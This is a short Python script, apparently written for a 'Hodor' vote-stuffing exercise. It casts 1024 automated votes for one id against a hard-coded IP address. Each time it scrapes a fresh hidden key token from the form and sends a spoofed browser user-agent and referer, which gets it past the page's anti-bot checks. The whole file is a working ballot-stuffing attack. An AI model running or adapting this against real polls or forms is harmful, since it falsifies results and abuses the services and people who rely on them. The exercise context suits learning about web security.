#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

# Global Variables
datos = {'id':'3670', 'key':'true', 'holdthedoor':'\n'}
url = 'http://158.69.76.135/level2.php'
windows_user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
header = {'user-agent': windows_user, 'referer': url}

for i in range(1024):
    #Creating a New Session
    new_session = requests.Session()
    #Getting the information of the page
    r = new_session.get(url)
    #Parsing information of the 
    text = BeautifulSoup(r.text, 'html.parser')
    tags = text.select('input[name="key"]')
    tag = tags[0].get('value')
    datos['key'] = tag
    resp = new_session.post(url, headers=header, data=datos)
    print("Vamos {} veces...".format(i))
    if resp.status_code == 200:
        pass
    else:
        print("We have an error here")
